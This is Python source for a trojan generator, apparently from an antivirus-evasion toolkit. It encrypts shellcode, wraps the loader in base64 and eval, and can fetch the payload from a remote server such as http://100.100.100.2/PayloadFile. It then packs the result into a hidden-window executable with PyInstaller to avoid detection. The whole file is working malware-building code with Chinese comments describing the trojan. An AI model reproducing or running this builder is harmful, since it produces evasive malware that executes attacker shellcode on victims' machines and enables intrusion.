import os
import sys
filepath=os.path.dirname(os.path.abspath(__file__))+'/shellcodeLoader'
print(filepath)
sys.path.append(filepath)
import PyInstaller.__main__
import shellcoder
import cmdcoder
import base64
import random
import string
import time

class Creater():
    def __init__(self,arg):
        self.loaderType=arg.get('shellcodeLoaderType')  #shellcode加载器类型
        print(self.loaderType)
        self.encType=arg.get('cryptoType')             #设置加密器类型
        self.mode=arg.get('spliteMode')                 #用于选择分离免杀shellcode的加载方式，不指定则不使用分离免杀，可以指定为从本地文件加载shellcode和网络加载shellcode
        self.payloadFile=arg.get('payloadFile')
        self.url=arg.get('url')
        arg.get('is_64')
        self.hiddenWindow=arg.get('is_hidden')
        self.savePyFile=arg.get('is_savePyFile')
        self.is_urlWriteIn=arg.get('is_urlWriteIn')

        if self.mode=='local':
            self.modeInfo='shellcode本地分离模式：'
        elif self.mode=='network':
            self.modeInfo='shellcode网络分离模式：'
        else:
            self.modeInfo=''

        self.shellcode=b''
        self.cmdcode=''         #获取shellcodeLoader目录下，shellcode加载器的main以及自定义函数中的代码，这些代码经过base64加密后会写入到最终的木马脚本中。
        self.deccode=''         #获取Encoder目录下，加解密脚本的Decode函数中的代码，这些代码经过base64加密后会写入到最终的木马脚本中。
        self.importP=''         #获取shellcodeLoader目录下，shellcode加载器所有import的内容，这些import需要写入最终的木马脚本中。
        self.modoleName=set()   #获取shellcodeLoader和加解密器中所有import的模块名
        self.otherdic=arg.get('otherdic')

    def GetShellcode(self):
        #获取加密后的shellcode
        self.shellcode=shellcoder.main(self.encType,self.mode,self.payloadFile,self.url,self.otherdic)


    def GetShellcodeLoader(self):
        #获取shellcode加载器代码
        self.cmdcode=cmdcoder.getcmd(self.loaderType,self.encType)
        #获取解码器的代码
        self.deccode=cmdcoder.getDecodecmd(self.encType)
        #获取最终代码需要import的包：包含shellcode加载器中所有import、加解密器中所有import、以及额外的几个import
        self.importP=cmdcoder.getImport(self.loaderType)
        if self.mode=='network':
            self.importP+='import requests\n'
        #获取shellcodeLoader和加解密器中所有import的模块名
        self.modoleName=cmdcoder.getModulName(self.loaderType,self.encType)



    def CreateTrojan(self):
        #生成最终运行的木马脚本

        #0.构造出加密后的shellcode、加密后的shellcode加载器代码、解密函数。key=random.randint(0,100)用于生成随机秘钥碰撞解密函数中的key
        cmd=f'{self.shellcode}\n' \
            f'{self.deccode}\n'

        cmd+=f'cmd={self.cmdcode}\n' if self.encType else self.cmdcode

        cmd+=f'key=random.randint(0,100)\n' \
             f'buf=Decode(buf,False,key)\n' \
             f'cmd=Decode(cmd,True,key)\n' if self.encType else ''

        # print(f'构造出的cmd：{cmd}\n'+'-'*80)
        #1.将上面构造出的核心代码做一次base64编码。
        cmd=base64.b64encode(cmd.encode())

        #2.构造最终的木马脚本：从self.importP获取需要import的包
        text=''
        text+=self.importP+'\n'
        #3.构造最终的木马脚本：给个for循环，加解密器可以实现随机碰撞，可参照base64Enc.py，核心代码使用eval来执行
        text+=f'{"" if self.is_urlWriteIn else "url=sys.argv[1]"}\n' \
              f'for i in range(10000):\n' \
              f'    try:\n' \
              f'        eval(compile(base64.b64decode({cmd}.decode()).decode(),"asd","exec"))'

        text+=f'\n        eval(compile(cmd,"asd","exec"))\n        main(buf)\n        {"break" if self.loaderType=="ProcessHollowing.py" else ""}\n    except FileNotFoundError:print("请将每次重新生成的PayloadFile文件放在本目录");time.sleep(3);break\n    except:pass'

        #print("{self.modeInfo}秘钥碰撞失败，如果多次运行程序还是失败，请确认已经将最新生成的PayloadFile放在本目录下（每次都会变化）")

        #4.按时间生成文件名
        self.file=time.strftime("%Y%m%d%H%M%S",time.localtime(time.time()))

        file=os.path.dirname(os.path.abspath(__file__))+os.sep+'result'+os.sep+self.file+'.py'
        try:
            os.makedirs(os.path.dirname(file))
        except:
            pass
        # print(file)
        with open(file,'w',encoding='utf-8') as f:
            f.write(text)





        #5.使用pyinstaller打包
        PyInstaller.__main__.run([
            f'result{os.sep}{self.file}.py',
            '-F',
            '--clean',
            f'--key={self.file}',                        #--key参数会将文件加密
            f'--hidden-import={",".join(self.modoleName)}',              #--hidden-import可以隐藏import的包
            f'--distpath=result',
            f'{"--noconsole" if self.hiddenWindow else "-y"}'
        ])

        time.sleep(1)
        os.remove(f'{self.file}.spec')

    def run(self):
        self.GetShellcode()
        self.GetShellcodeLoader()
        self.CreateTrojan()

        #弹出result文件夹
        os.startfile(os.path.dirname(os.path.abspath(__file__))+os.sep+'result')

        #删除.py文件
        if not self.savePyFile:
            try:
                os.remove(f'result{os.sep}{self.file}.py')
            except:
                pass
        tip1=f"<span style='color: green;'>已成功生成木马：{os.path.dirname(os.path.abspath(__file__))+os.sep+'result'+self.file}.exe</span><br>"
        tip2=f"您使用了shellcode本地分离模式，请将PayloadFile文件和木马放在同目录下运行" if self.mode=='local' else f"使用了shellcode网络分离模式，请确定已经将每次生成的PayloadFile（每次会变）放于服务器上[如果配置了SSH服务器将会自动同步]，URL地址：<a href='{self.url}'>{self.url}</a>"
        tip3=f"<span style='color: green;'> url已写入木马文件，可直接运行exe</span>" if self.is_urlWriteIn else f"<span style='color: green;'><br/>url未写入木马文件，请运行{self.file}.exe {self.url if self.url else 'http://x.x.x.x'}</span>"


        return tip1+(tip2 if self.mode else '') +(tip3 if self.mode=='network' else "")

if __name__ == '__main__':
    arg={
        'shellcodeLoaderType':'VirtualAlloc1.py',
        'cryptoType':'base64Enc.py',
        'spliteMode': 'network',
        'payloadFile':r'D:/BaiduSyncdisk/dyb/a_penetration/kali_tools/my_project/project/BypassAV/掩月/config/payloadJQuery.py',
        'url':'http://100.100.100.2/PayloadFile',
        'is_64':2,
        'is_hidden':0,
        'is_savePyFile':2,
        'is_urlWriteIn':2,
        'otherdic':{}
    }



    Creater(arg).run()